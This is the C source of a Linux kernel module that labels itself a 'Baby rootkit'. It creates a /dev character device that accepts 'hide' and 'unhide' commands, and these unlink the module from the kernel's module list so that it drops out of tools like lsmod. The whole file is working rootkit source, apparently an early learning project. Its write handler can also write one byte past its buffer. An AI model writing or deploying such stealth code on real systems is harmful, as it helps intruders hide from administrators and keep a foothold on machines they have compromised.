#include <linux/module.h> // required for all LKMs
#include <linux/init.h> // required for __init and __exit
#include <linux/uaccess.h> // needed for put_user()
//#include <linux/fs.h> // needed for register_chardev
#include <linux/cdev.h> // needed for device_destroy()
#include <linux/seq_file.h> /* seq_read, seq_lseek, single_release */
//#include <linux/kernel.h>
//#include <linux/sched.h>
//#include <linux/oom.h>

#define DEBUG

#ifdef DEBUG
#define DEBUG_PRINT(msg, ...) pr_info(msg, ##__VA_ARGS__)
#else
#define DEBUG_PRINT(...)
#endif

#define BUFF_LEN 1024

MODULE_INFO(intree, "Y");
MODULE_AUTHOR("Zach");
MODULE_LICENSE("GPL v2");
MODULE_DESCRIPTION("Baby rootkit");
MODULE_VERSION("0.2");


static char* filename = THIS_MODULE->name;
module_param(filename, charp, 0000);
MODULE_PARM_DESC(filename, "Filename in /dev");
static char* cmd_ptr;
static char cmd_str[BUFF_LEN];
static int major = -1;
static struct cdev mycdev;
static struct class *myclass = NULL;
static struct list_head * prev;
static int hidden = 0;
static char status_str[BUFF_LEN];
static char * status_ptr;
static int device_open_count = 0;

static int hide_self(void);
static int unhide_self(void);
static int device_open(struct inode *, struct file *);
static int device_release(struct inode *, struct file *);
static ssize_t device_write(struct file *, const char *, size_t, loff_t *);
static ssize_t device_read(struct file *, char *, size_t, loff_t *);

// operations on our /dev/$filename file
// and their associated functions
static const struct file_operations file_ops = {
	.read = device_read,
	.write = device_write,
	.open = device_open,
	.release = device_release
};

static ssize_t device_read(struct file *filp, char *buffer, size_t length, loff_t *offset)
{
	int bytes_read = 0;
	DEBUG_PRINT("%s: in device_read", THIS_MODULE->name);
	while (length && *status_ptr) {
		put_user(*(status_ptr++), buffer++);
		length--;
		bytes_read++;
	}
	return bytes_read;
}


static void cleanup(int device_created)
{
	DEBUG_PRINT("%s in cleanup", THIS_MODULE->name);
	if (device_created) {
		device_destroy(myclass, major);
		cdev_del(&mycdev);
	}
	if (myclass)
		class_destroy(myclass);
	if (major != -1)
		unregister_chrdev_region(major, 1);
}


static void parse_command(char * cmd)
{
	int hide;
	int unhide;
	DEBUG_PRINT("%s: in parse_command.\n", THIS_MODULE->name);
	DEBUG_PRINT("Command: '%s'", cmd);
	hide = strncmp(cmd, "hide\n", BUFF_LEN);
	if (hide == 0) {
		hide_self();
		return;
	}
	unhide = strncmp(cmd, "unhide\n", BUFF_LEN);
	if (unhide == 0) {
		unhide_self();
		return;
	}
}


// Called when a process tries to write to our device 
static ssize_t device_write(struct file *flip, const char *buffer, size_t len, loff_t *offset)
{
	DEBUG_PRINT("%s: in device_write", THIS_MODULE->name);

	int i;
	for (i = 0; i < len && i < BUFF_LEN; i++)
		get_user(cmd_str[i], buffer + i);

	cmd_str[i] = 0; // null terminating byte; very important!
	cmd_ptr = cmd_str;

	// return the number of input characters used
	parse_command(cmd_str);
	return i;
}


// Called when a process opens our device
static int device_open(struct inode *inode, struct file *file)
{
	DEBUG_PRINT("%s: in device_open", THIS_MODULE->name);

	// make sure only one process is using our device
	if (device_open_count) return -EBUSY;

	device_open_count++;

	//  initialize the message 
	cmd_ptr = cmd_str;
	status_ptr = status_str;
	try_module_get(THIS_MODULE);
	return 0;
}


// Called when a process closes our device 
static int device_release(struct inode *inode, struct file *file)
{
	// decrement the open counter and usage count. Without this, the module would not unload.
	DEBUG_PRINT("%s: in device_release\n", THIS_MODULE->name);
	device_open_count--;
	module_put(THIS_MODULE);
	return 0;
}


static int hide_self(void)
{
	DEBUG_PRINT("%s: in hide_self\n", THIS_MODULE->name);
	if (hidden) {
		strncpy(status_str, "Error: already hidden!\n", BUFF_LEN);
		return -1;
	}
	prev = THIS_MODULE->list.prev;
	mutex_lock(&module_mutex);
	list_del(&THIS_MODULE->list);
	mutex_unlock(&module_mutex);
	hidden = 1;
	strncpy(status_str, "Successfully hid.\n", BUFF_LEN);
	return 0;
}


static int unhide_self(void)
{
	DEBUG_PRINT("%s: in unhide_self\n", THIS_MODULE->name);
	if (hidden == 0) {
		strncpy(status_str, "Error: already visible!\n", BUFF_LEN);
		return -1;
	}
	mutex_lock(&module_mutex);
	list_add(&THIS_MODULE->list, prev);
	mutex_unlock(&module_mutex);
	hidden = 0;
	strncpy(status_str, "Successfully unhid!\n", BUFF_LEN);
	return 0;
}


static int __init mod_init(void)
{
	int device_created = 0;
	DEBUG_PRINT("%s: starting up\n", THIS_MODULE->name);
	DEBUG_PRINT("%s: filename='%s'\n", THIS_MODULE->name, filename);
	DEBUG_PRINT("%s: registering device %s\n", THIS_MODULE->name, filename);

	// /proc/devices
	if (alloc_chrdev_region(&major, 0, 1, filename) < 0) {
		goto error; // NOTE to anyone reading this: I think "goto"
		// works well here. If you have a better idea,
		// I'd like to hear it -- Zach
	}
	// /sys/class
	if ((myclass = class_create(THIS_MODULE, filename)) == NULL) {
		goto error;
	}
	// /dev/
	if (device_create(myclass, NULL, major, NULL, filename) == NULL) {
		goto error;
	}

	device_created = 1;
	cdev_init(&mycdev, &file_ops);

	if (cdev_add(&mycdev, major, 1) == -1){
		goto error;
	}

	DEBUG_PRINT("%s: succesfully registered!\n", THIS_MODULE->name);
	snprintf(status_str, BUFF_LEN, "%s initialized and awaiting command!\n", THIS_MODULE->name);
	return 0;

error:
	DEBUG_PRINT("%s: failed to register device!\n", THIS_MODULE->name);
	cleanup(device_created);
	return -1;
}


static void __exit mod_exit(void)
{
	DEBUG_PRINT("%s: in mod_exit\n", THIS_MODULE->name);
	cleanup(1);
}

module_init(mod_init);
module_exit(mod_exit);
